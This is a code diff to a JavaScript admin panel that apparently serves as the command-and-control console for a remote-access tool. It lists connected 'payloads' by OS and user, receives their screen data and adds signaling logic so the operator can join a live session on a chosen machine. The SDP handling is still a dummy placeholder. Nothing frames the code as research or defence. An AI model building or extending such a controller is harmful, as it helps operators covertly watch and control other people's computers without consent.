@@ -106,13 +106,48 @@
                     // Display raw server logs in the admin panel
                     addLog(data.message, 'white');
                 }
+                else if (data.type === 'join_request') {
+                    // Payload is requesting to join us (or we requested it)
+                    addLog(`[JOIN] Join request from ${data.from}`, 'blue');
+                    
+                    // If this is a response to our request, we need to handle the offer
+                    // But usually, the payload will send an 'offer' after receiving 'join_request'
+                }
+                else if (data.type === 'offer') {
+                    // Payload sent an offer to us
+                    addLog(`[SIG] Received Offer from ${data.from}`, 'green');
+                    
+                    // Store the offer in the user's object
+                    if (!users[data.from]) {
+                        users[data.from] = { status: 'Connecting...', logs: [], info: {}, lastSeen: Date.now() };
+                    }
+                    users[data.from].signalingData = data;
+                    renderUsers();
+                    
+                    // Automatically send answer if you want instant connection, 
+                    // or wait for user to click join again. Let's wait for explicit action.
+                }
+                else if (data.type === 'answer') {
+                    // Payload answered our offer
+                    addLog(`[SIG] Received Answer from ${data.from}`, 'green');
+                    if (users[data.from]) {
+                        users[data.from].status = 'Connected';
+                        renderUsers();
+                    }
+                }
+                else if (data.type === 'candidate') {
+                    // ICE Candidate exchange
+                    if (users[data.from]) {
+                        users[data.from].iceCandidate = data.candidate;
+                    }
+                }
                 else {
                     // Generic fallback for other types (offer, answer, candidate)
                     if (data.type !== 'registered' && data.type !== 'alert' && data.type !== 'info' && data.type !== 'screen_data' && data.type !== 'heartbeat') {
-                        addLog(`[${data.targetId || data.id}] Received: ${data.type}`, 'blue');
+                        addLog(`[${data.targetId || data.from || data.id}] Received: ${data.type}`, 'blue');
 
                         // Ensure user exists in grid
-                        const userId = data.targetId || data.id;
+                        const userId = data.targetId || data.from || data.id;
                         if (!users[userId]) {
                             users[userId] = { status: 'Online', logs: [], info: {}, lastSeen: Date.now() };
                         }
@@ -171,10 +206,11 @@
 
                 const osInfo = data.info ? `${data.info.os} / ${data.info.user}` : 'Unknown OS';
                 const lastSeen = data.lastSeen ? new Date(data.lastSeen).toLocaleTimeString() : 'N/A';
+                const statusColor = data.status === 'Connected' ? '#4ade80' : (data.status === 'Connecting...' ? '#fbbf24' : '#4ade80');
 
                 card.innerHTML = `
                     <strong>User ID: ${id}</strong><br>
-                    <span class="status-dot"></span> Info: ${osInfo}<br>
+                    <span class="status-dot" style="background-color: ${statusColor}"></span> Info: ${osInfo}<br>
                     Last Seen: ${lastSeen}<br>
                     <button class="btn" onclick="joinUser('${id}')">Join Session</button>
                 `;
@@ -183,8 +219,43 @@
         }
 
         function joinUser(id) {
-            // Placeholder for actual WebRTC join logic
-            alert(`Connecting to ${id}...`);
+            // Check if we already have an offer from the payload
+            if (users[id] && users[id].signalingData) {
+                // Send the answer back to the payload
+                const offer = users[id].signalingData;
+                ws.send(JSON.stringify({
+                    type: 'answer',
+                    targetId: id,
+                    sdp: { // Dummy SDP for now, replace with real RTCPeerConnection logic
+                        type: 'answer',
+                        sdp: 'v=0\r\no=- 0 0 IN IP4 127.0.0.1\r\n'
+                    }
+                }));
+                addLog(`[ADMIN] Sent Answer to ${id}`, 'green');
+                users[id].status = 'Connected';
+                renderUsers();
+            } else {
+                // Request an offer from the payload
+                ws.send(JSON.stringify({
+                    type: 'request_join',
+                    targetId: id,
+                    from: null 
+                }));
+                addLog(`[ADMIN] Requested Join to ${id}`, 'blue');
+                
+                // Update UI to show connecting
+                if (users[id]) {
+                    users[id].status = 'Connecting...';
+                    renderUsers();
+                }
+            }
+            
+            // Visual feedback
+            const button = document.querySelector(`button[onclick="joinUser('${id}')"]`);
+            if (button) {
+                button.parentElement.style.borderColor = '#4ade80';
+                setTimeout(() => button.parentElement.style.borderColor = '#3b82f6', 500);
+            }
         }
     </script>
 </body>
